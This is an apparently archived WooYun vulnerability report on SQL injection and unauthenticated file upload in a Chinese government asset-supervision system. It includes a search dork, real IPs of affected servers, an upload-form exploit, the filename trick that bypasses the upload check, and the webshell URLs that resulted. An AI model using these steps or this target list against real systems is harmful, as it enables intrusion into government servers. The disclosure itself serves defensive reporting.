{"id": 52562, "wybug_id": "wooyun-2014-070866", "wybug_title": "某政府监察平台通用SQL注入、任意文件上传GETSHELL（无需登录）", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "sex is not show", "wybug_date": "2014-08-04 11:43", "wybug_open_date": "2014-11-02 11:44", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件上传", "注入"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-08-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-08-11：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-10-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-10-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-11-02：\t细节向公众公开  简要描述： 周末来一发 详细说明：  开发公司：北京中农信达信息技术有限公司（http://www.agrij.com/）程序名称：中农信达农村集体三资网络监管系统漏洞类型：SQL注入，任意文件上传导致代码执行漏洞文件：/init/download_attach.jsp?id=-1  参数id          /reports/upload_img.jsp 任意文件上传是否需要登录：否关键字：inurl:login_form.jspintitle:中农信达农村集体三资网络监管系统影响用户：以下案例百度搜集，方便演示：\nhttp://202.99.207.13:8081/finance11n/init/download_attach.jsp?id=-1http://124.164.240.217:8080/finance03/init/download_attach.jsp?id=-1http://111.12.148.194:7005/finance_qhld/init/download_attach.jsp?id=-1http://61.185.74.147:8080/finance67/init/download_attach.jsp?id=-1http://nat.nat123.net:11158/finance/init/download_attach.jsp?id=-1http://www.cldwcwgk.gov.cn:8083/finance80/init/download_attach.jsp?id=-1http://116.255.135.35:8082/finance_glx/init/download_attach.jsp?id=-1http://221.131.81.143:7001/finance_oracle/init/download_attach.jsp?id=-1\n一：SQL注入/init/download_attach.jsp?id=-1实例演示：1.http://111.12.148.194:7005/finance_qhld//init/download_attach.jsp?id=-1\n\n2.http://124.164.240.217:8080/finance03//init/download_attach.jsp?id=-1\n\n\n\n3.http://219.157.74.6:8080/finance/init/download_attach.jsp?id=-1\n\n4.http://61.185.74.147:8080/finance67/init/download_attach.jsp?id=-1\n\n5.http://116.255.135.35:8082/finance_glx/init/download_attach.jsp?id=-1\n\n   漏洞证明：  二：任意文件上传存在文件：/reports/upload_img.jsp利用本地构造表单提交，还需要改一下post包即可，看演示吧本地表单代码：\n<html><form action=\"http://xxxx.com/financeXXX/reports/upload_img.jsp\" name=\"test\" method=\"post\" enctype=\"multipart/form-data\"><input type=\"hidden\" name=\"c_path\" value=\"/\"/><input type=\"hidden\" name=\"resource_id\" value=\"/\"/><input type=\"file\" name=\"uri\" size=\"23\" id=\"file\" /><input type=\"submit\" value=\"Submit\" /></form></html>\n实例演示：1.http://124.164.240.217:8080/finance03/reports/upload_img.jsp通过上面的表单提交并抓包，把其中的filename=\"xxx.jsp\"中的第一个引号删掉，看截图：\n\n\n\nshell地址：http://124.164.240.217:8080/finance03/user/resource//_JFolder.jsp\n\n2.http://116.255.135.35:8082/finance_glx/reports/upload_img.jsp本地提交并抓包：\n\n\n\nshell地址：http://116.255.135.35:8082/finance_glx/user/resource//_JFolder.jsp\n\n3.http://111.12.148.194:7005/finance_qhld/reports/upload_img.jsp先本地构造抓包：\n\n\n\nshell地址：http://111.12.148.194:7005/finance_qhld/user/resource//_JFolder.jsp\n\n4.http://202.99.207.13:8081/finance11n/reports/upload_img.jsp本地提交抓包：\n\n\n\nshell地址：http://202.99.207.13:8081/finance11n/user/resource//_JFolder.jsp\n\n5.http://219.157.74.6:8080/finance/reports/upload_img.jsp本地构造提交并抓包：\n\n\n\nshell地址：http://219.157.74.6:8080/finance/user/resource//_JFolder.jsp\n\n   修复方案：  1. 参数过滤2.上传文件类型作限制，同时限定上传点权限访问   版权声明：转载请注明来源 sex is not show@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-08-08 16:12 厂商回复： CNVD确认所述专有系统漏洞风险，已经由CNVD按以往建立的联系渠道向软件生产厂商通报。按多个漏洞评分，rank 20 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-08-04 17:08 |    \t\tsex is not show  \t\t\t( 普通白帽子  |\t\t\t        Rank:1495 漏洞数:233        | 这家伙真懒！)\t\t \n  @疯狗@Finger 上一个还是大厂商，这个咋又小厂商了 - -||    \n     2014-08-04 17:10 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  感觉这个真该大厂商？    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}